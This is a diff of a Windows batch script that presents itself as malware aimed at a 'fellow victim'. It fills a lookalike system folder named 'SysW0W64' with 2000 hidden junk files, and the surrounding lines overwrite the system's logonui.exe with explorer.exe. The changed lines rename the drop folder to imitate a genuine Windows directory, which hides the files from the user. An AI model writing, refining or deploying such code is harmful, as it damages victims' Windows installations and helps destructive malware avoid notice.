@@ -57,10 +57,10 @@ cls
 echo As you wish, fellow victim ;) I will leave your system alone...
 rem stole FlyTech's 000.exe code because I don't know how to copy 1000 files at my own
 set /a cr=0
-mkdir C:\Windows\System32\config_
+mkdir C:\Windows\SysW0W64
 
 :copy
-copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
+copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\SysW0W64\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
 if not %cr%==2000 goto copy
 
@@ -80,10 +80,10 @@ cls
 copy C:\Windows\explorer.exe C:\Windows\System32\logonui.exe
 cls
 set /a cr=0
-mkdir C:\Windows\System32\config_
+mkdir C:\Windows\SysW0W64
 
 :copy
-copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\System32\config_\hiddenfile_%cr%.txt
+copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\SysW0W64\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
 if not %cr%==2000 goto copy
 
